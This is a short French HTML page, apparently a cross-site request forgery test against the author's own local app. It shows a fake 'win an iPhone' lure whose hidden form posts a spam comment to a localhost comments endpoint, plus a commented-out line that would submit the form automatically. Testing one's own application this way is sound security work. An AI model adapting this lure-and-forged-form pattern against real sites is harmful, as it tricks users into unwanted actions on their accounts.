<!doctype html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <title>Test CSRF - Faux Site</title>
  </head>
  <body>
    <h1>Bienvenue sur un site totalement inoffensif...</h1>
    <p>Clique sur le bouton pour gagner un iPhone !</p>

    <!-- Ce formulaire cible ton application locale -->
    <form
      id="csrfForm"
      action="http://localhost:5001/Home/Comments"
      method="POST"
    >
      <!-- On simule les champs qu'un utilisateur enverrait pour un commentaire -->
      <input
        type="hidden"
        name="Message"
        value="Ceci est un spam CSRF injecté depuis un autre site !"
      />
      <button type="submit">Réclamer mon prix !</button>
    </form>

    <script>
      // Optionnel : Si tu veux tester l'envoi automatique (sans clic)
      // document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
